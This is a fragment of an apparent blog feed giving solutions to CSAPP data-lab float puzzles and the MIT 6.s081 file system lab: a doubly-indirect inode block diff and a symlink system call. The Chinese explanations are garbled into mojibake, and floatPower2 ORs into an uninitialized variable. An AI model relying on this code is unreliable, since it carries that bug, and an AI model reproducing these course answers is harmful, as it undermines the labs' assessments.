keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token keyword">return</span> uf<span class="token punctuation">;</span>        <span class="token comment">// æ— ç©·å¤§æˆ–è€… NaN</span>    <span class="token comment">// éè§„æ ¼åŒ–æ•°</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        m <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0xff800000</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> m<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// è§„æ ¼åŒ–æ•°</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        t <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0x807fffff</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> uf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><h2 id="æ€è·¯-11"><a href="#æ€è·¯-11" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¦–å…ˆç¡®å®šæ•´æ•°æ‰€èƒ½è¡¨ç¤ºçš„ä¸Šä¸‹ç•Œçš„å€¼ï¼šå½“é˜¶ç å°äº 127ï¼Œå³æŒ‡æ•°ä½å°äº 0 æ—¶ï¼Œæ­¤æ—¶æµ®ç‚¹æ•° uf å°äº 1ï¼Œå¯¹åº”çš„æ•´æ•°ä¸º 0ï¼›å½“é˜¶ç å¤§äº 150ï¼Œå³æŒ‡æ•°ä½å¤§äº 23 æ—¶ï¼Œæ­¤æ—¶å•ç²¾åº¦æµ®ç‚¹æ•°çš„ç²¾åº¦ï¼ˆå°¾æ•°é•¿åº¦ï¼‰ä¸è¶³ä»¥æ­£ç¡®è¡¨ç¤ºå¯¹åº”çš„æ•´æ•°ï¼Œè¿”å› 0x80000000ã€‚</p><p>å¯¹äºåœ¨åˆç†èŒƒå›´å†…çš„ ufï¼Œå°†å…¶è½¬æ¢ä¸ºå¯¹åº”çš„æ•´æ•°ï¼Œé¦–å…ˆéœ€è¦å°¾æ•°æœ€é«˜ä½çš„é«˜ä¸€ä½åŠ ä¸Šè§„æ ¼åŒ–æ•°éšå«çš„ 1ï¼Œå†æ ¹æ®é˜¶ç çš„å¤§å°å°†å°¾æ•°è¿›è¡Œå³ç§»ï¼Œé˜¶ç è¶Šå¤§ï¼Œå³ç§»ä½æ•°è¶Šå°‘ã€‚æœ€åæ ¹æ®ç¬¦å·ä½çš„å€¼é€‰æ‹©æ˜¯å¦å°†ç»“æœå–ååŠ ä¸€ã€‚</p><h2 id="ä»£ç -11"><a href="#ä»£ç -11" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// ç¬¦å·</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// é˜¶ç </span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// å°¾æ•°</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// å°äº 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// å¤§äº 1 ä¸”ä¸æº¢å‡º</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;=</span> <span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> m <span class="token operator">|</span> <span class="token number">0x800000</span><span class="token punctuation">;</span>        val <span class="token operator">>>=</span> <span class="token punctuation">(</span><span class="token number">23</span> <span class="token operator">-</span> <span class="token punctuation">(</span>t <span class="token operator">-</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            val <span class="token operator">=</span> <span class="token operator">~</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// æº¢å‡º</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x80000000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><h2 id="æ€è·¯-12"><a href="#æ€è·¯-12" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>åŒæ ·æ˜¯å¯¹è§„æ ¼åŒ–æ•°å’Œéè§„æ ¼åŒ–æ•°çš„åˆ†ç±»è®¨è®ºï¼š</p><p>å½“ <code>x &gt;= -150 &amp;&amp; x &lt; -127</code> æ—¶ï¼Œç»“æœä¸ºéè§„æ ¼åŒ–æ•°ï¼Œæ­¤æ—¶æµ®ç‚¹æ•°è¡¨ç¤ºåªæœ‰ä¸€ä¸ªä½ä¸º 1ï¼Œå…¶ä½™å…¨ä¸º 0ã€‚ç›´æ¥æ ¹æ®æŒ‡æ•° x çš„å€¼ç¡®å®šè¯¥ä½çš„ä½ç½®å³å¯ã€‚</p><p>å½“ <code>x &gt;= -127 &amp;&amp; x &lt; 128</code> æ—¶ï¼Œç»“æœä¸ºè§„æ ¼åŒ–æ•°ï¼Œæ­¤æ—¶æµ®ç‚¹æ•°è¡¨ç¤ºçš„å°¾æ•°å…¨ä¸º 0ï¼Œåªæœ‰é˜¶ç ç”¨æ¥è¡¨ç¤ºæŒ‡æ•°çš„å€¼ã€‚æ ¹æ®æŒ‡æ•° x çš„å€¼ç¡®å®šé˜¶ç çš„å€¼ï¼Œç„¶åæ„é€ å‡ºæµ®ç‚¹æ•°å³å¯ã€‚</p><h2 id="ä»£ç -12"><a href="#ä»£ç -12" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> val<span class="token punctuation">;</span>    <span class="token comment">// å¤ªå°</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// éè§„æ ¼åŒ–æ•°</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// è§„æ ¼åŒ–æ•°</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">unsigned</span> t <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>        val <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// å¤ªå¤§</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAPP çš„ç¬¬ä¸€ä¸ª Labï¼Œå¯¹åº”çŸ¥è¯†ç‚¹ä¸ºä¹¦ä¸­çš„ç¬¬ 2 ç« ï¼ˆä¿¡æ¯çš„è¡¨ç¤ºä¸å¤„ç†ï¼‰ï¼Œè¦æ±‚ä½¿ç”¨å—é™åˆ¶çš„è¿ç®—ç¬¦å’Œè¡¨è¾¾å¼å®ç°ä¸€äº›ä½æ“ä½œã€‚ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šæ•´æ•°éƒ¨åˆ†å’Œæµ®ç‚¹æ•°éƒ¨åˆ†ã€‚å…¶ä¸­æ•´æ•°éƒ¨åˆ†é™åˆ¶è¾ƒå¤šï¼Œæ¯”è¾ƒåé‡æŠ€å·§æ€§ï¼Œéƒ¨åˆ†é¢˜ä¸ªäººè®¤ä¸ºå¾ˆæœ‰éš¾åº¦ã€‚è€Œæµ®ç‚¹æ•°éƒ¨åˆ†åˆ™æ¯”è¾ƒåŸºç¡€ï¼Œä¸»è¦è€ƒå¯Ÿå¯¹ IEEE 754 æ ‡å‡†çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œä»£ç è¾ƒé•¿ï¼Œä½†æ€è·¯ç›¸å¯¹ç®€å•ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="è®¡ç®—æœºåŸºç¡€" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="è®¡ç®—æœºåŸºç¡€" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="ä½è¿ç®—" scheme="http://lordaeronesz.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab File system</title>
    <link href="http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/"/>
    <id>http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/</id>
    <published>2024-08-16T03:45:11.000Z</published>
    <updated>2024-08-16T10:21:40.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>xv6 æ–‡ä»¶ç³»ç»Ÿçš„ inode ä¸­åœ°å€åŸŸ <code>addrs[]</code> ç”± 12 ä¸ªç›´æ¥åœ°å€å’Œ 1 ä¸ªä¸€çº§é—´æ¥åœ°å€ç»„æˆï¼Œæœ¬å®éªŒè¦æ±‚å°†åœ°å€åŸŸæ›´æ”¹ä¸º 11 ä¸ªç›´æ¥åœ°å€ã€1 ä¸ªä¸€çº§é—´æ¥åœ°å€å’Œ 1 ä¸ªäºŒçº§é—´æ¥åœ°å€ç»„æˆï¼Œä»¥æ”¯æŒæ›´å¤§æ–‡ä»¶çš„å­˜å‚¨ã€‚</p><p>ä»£ç çš„å®ç°æœ‰äº†ç›´æ¥åœ°å€å’Œä¸€çº§é—´æ¥åœ°å€åšå‚è€ƒï¼Œå°±å¾ˆç®€å•äº†ï¼Œç›´æ¥æŸ¥çœ‹ä»£ç éƒ¨åˆ†å³å¯ã€‚</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/file.h b/kernel/file.hindex b076d1d..5c4eb3a 100644<span class="token coord">--- a/kernel/file.h</span><span class="token coord">+++ b/kernel/file.h</span>@@ -26,7 +26,7 @@ struct inode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// map major device number to device functions.</span></span>diff --git a/kernel/fs.c b/kernel/fs.cindex 40c9bd4..4c00ab5 100644<span class="token coord">--- a/kernel/fs.c</span><span class="token coord">+++ b/kernel/fs.c</span>@@ -400,6 +400,33 @@ bmap(struct inode *ip, uint bn)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    brelse(bp);</span><span class="token prefix unchanged"> </span><span class="token line">    return addr;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  bn -= NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if (bn &lt; NINDIRECT2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = ip->addrs[NDIRECT + 1]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      ip->addrs[NDIRECT + 1] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    uint i = bn / NINDIRECT, j = bn % NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[i]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[i] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[j]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[j] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    return addr;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  panic("bmap: out of range");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -432,6 +459,29 @@ itrunc(struct inode *ip)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    ip->addrs[NDIRECT] = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct buf *bp2;</span><span class="token prefix inserted">+</span><span class="token line">  uint *a2;</span><span class="token prefix inserted">+</span><span class="token line">  if (ip->addrs[NDIRECT + 1]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    for (i = 0; i &lt; NINDIRECT; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (a[i]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        bp2 = bread(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">        a2 = (uint *)bp2->data;</span><span class="token prefix inserted">+</span><span class="token line">        for (j = 0; j &lt; NINDIRECT; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">          if (a2[j]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            bfree(ip->dev, a2[j]);</span><span class="token prefix inserted">+</span><span class="token line">          &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        brelse(bp2);</span><span class="token prefix inserted">+</span><span class="token line">        bfree(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line">    bfree(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    ip->addrs[NDIRECT + 1] = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  ip->size = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  iupdate(ip);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/fs.h b/kernel/fs.hindex 139dcc9..cd5de8a 100644<span class="token coord">--- a/kernel/fs.h</span><span class="token coord">+++ b/kernel/fs.h</span>@@ -24,9 +24,10 @@ struct superblock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define FSMAGIC 0x10203040</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define NDIRECT 12</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NDIRECT 11</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define NINDIRECT (BSIZE / sizeof(uint))</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NINDIRECT2 (NINDIRECT * NINDIRECT)</span><span class="token prefix inserted">+</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT + NINDIRECT2)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// On-disk inode structure</span><span class="token prefix unchanged"> </span><span class="token line">struct dinode &#123;</span></span>@@ -35,7 +36,7 @@ struct dinode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;          // Minor device number (T_DEVICE only)</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;          // Number of links to inode in file system</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;            // Size of file (bytes)</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];   // Data block addresses</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];   // Data block addresses</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Inodes per block.</span></span></code></pre><h1 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æœ¬å®éªŒè¦æ±‚ä¸º xv6 å®ç°ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰æœºåˆ¶ï¼Œç¬¦å·é“¾æ¥æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œåªä¸è¿‡å®ƒçš„æ•°æ®å†…å®¹ä¸ºè¯¥é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™å…¶å®ä¸ Windows ç³»ç»Ÿçš„å¿«æ·æ–¹å¼ååˆ†ç±»ä¼¼ã€‚å®ç°æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><p>é¦–å…ˆä¾ç…§ Lab System call ä¸­çš„æ–¹æ³•ï¼Œæ·»åŠ ç³»ç»Ÿè°ƒç”¨ <code>symlink</code>ï¼šæ·»åŠ  <code>symlink()</code> å£°æ˜ï¼Œæ·»åŠ ç³»ç»Ÿè°ƒç”¨å·ï¼Œæ·»åŠ ç³»ç»Ÿè°ƒç”¨ entryï¼Œæ·»åŠ  <code>sys_symlink()</code> å£°æ˜ã€‚</p><p>åœ¨ç†è§£äº†ç¬¦å·é“¾æ¥çš„æœ¬è´¨åï¼Œå°±å¯ä»¥ç€æ‰‹å®ç° <code>sys_symlink</code> äº†ã€‚é¦–å…ˆæ˜ç¡®ä¸€ä¸‹ <code>symlink</code> çš„ä½œç”¨ï¼Œå®ƒåŒ…å«ä¸¤ä¸ªå‚æ•°ï¼štarget å’Œ pathï¼Œä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªç›®å½•ä¸º path çš„ç¬¦å·é“¾æ¥ï¼Œè¯¥ç¬¦å·é“¾æ¥æŒ‡å‘ç›®å½•ä¸º target çš„æ–‡ä»¶ã€‚å®ç°æ€è·¯åº”è¯¥æ¯”è¾ƒæ¸…æ™°ï¼šä½¿ç”¨ <code>create()</code> åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç±»å‹ä¸ºç¬¦å·é“¾æ¥ï¼ˆéœ€è¦è‡ªè¡Œå®šä¹‰ï¼‰çš„æ–‡ä»¶ï¼Œå†ä½¿ç”¨ <code>writei()</code> å°†å­—ç¬¦ä¸² path å†™å…¥è¯¥æ–‡ä»¶ä¸­ã€‚</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_symlink</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n1<span class="token punctuation">,</span> n2<span class="token punctuation">;</span>    <span class="token keyword">char</span> target<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">,</span> path<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>ip<span class="token punctuation">;</span>    <span class="token comment">// get arguments of symlink</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n1 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>n2 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">begin_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// create symbol link in the path</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ip <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> T_SYMLINK<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// write target to file that ip points to</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writei</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> n1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å®ç°äº†ç¬¦å·é“¾æ¥çš„åˆ›å»ºä¹‹åï¼Œè¿˜éœ€è¦ä¿®æ”¹ <code>sys_open()</code>ï¼Œå®ç°å¯¹ç¬¦å·é“¾æ¥çš„ç‰¹æ®Šå¤„ç†ï¼šå½“è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥å¹¶ä¸”éœ€è¦ä»¥è·Ÿéšï¼ˆfollowï¼‰çš„æ–¹å¼æ‰“å¼€æ—¶ï¼Œå°±ä¸æ–­å‘ä¸‹é€’å½’ï¼Œå°†å½“å‰çš„ inode æŒ‡é’ˆæŒ‡å‘ç¬¦å·é“¾æ¥æŒ‡å‘æ–‡ä»¶çš„ inodeï¼Œç›´åˆ° inode æŒ‡é’ˆå¯¹åº”çš„æ–‡ä»¶ç±»å‹ä¸æ˜¯ç¬¦å·é“¾æ¥ï¼Œæ­¤æ—¶è¯¥ inode æŒ‡é’ˆæŒ‡å‘çš„æ–‡ä»¶æ‰æ˜¯æœ¬æ¬¡ <code>sys_open()</code> ç³»ç»Ÿè°ƒç”¨å®é™…éœ€è¦æ‰“å¼€çš„æ–‡ä»¶ã€‚</p><p>è¿™é‡Œè¦ç”¨åˆ°ä¸¤ä¸ªå…³é”®å‡½æ•° <code>readi()</code> å’Œ <code>namei()</code>ã€‚å…¶ä¸­ <code>readi()</code> èƒ½å¤Ÿæ ¹æ® inode æŒ‡é’ˆï¼Œä»è¯¥ inode æŒ‡é’ˆå¯¹åº”çš„æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼›è€Œ <code>namei()</code> èƒ½å¤Ÿæ ¹æ®æŒ‡å®šçš„è·¯å¾„ï¼Œè¿”å›è¯¥è·¯å¾„å¯¹åº”æ–‡ä»¶çš„ inode æŒ‡é’ˆã€‚â€œè·Ÿéšâ€çš„åŸºæœ¬æµç¨‹å°±æ˜¯å…ˆä½¿ç”¨è¯»å–å½“å‰ inode ä¸­çš„æ•°æ®ï¼Œå³ç›®æ ‡æ–‡ä»¶è·¯å¾„ pathï¼Œå†å°†å½“å‰ inode æŒ‡é’ˆæŒ‡å‘ path ç›®å½•å¯¹åº”çš„æ–‡ä»¶ï¼Œä»¥æ­¤å¾€å¤ã€‚</p><p>æœ€åè¿˜æœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œå°±æ˜¯å½“å¤šä¸ªç¬¦å·é“¾æ¥å½¢æˆä¸€ä¸ªç¯æ—¶ï¼Œè¿™æ 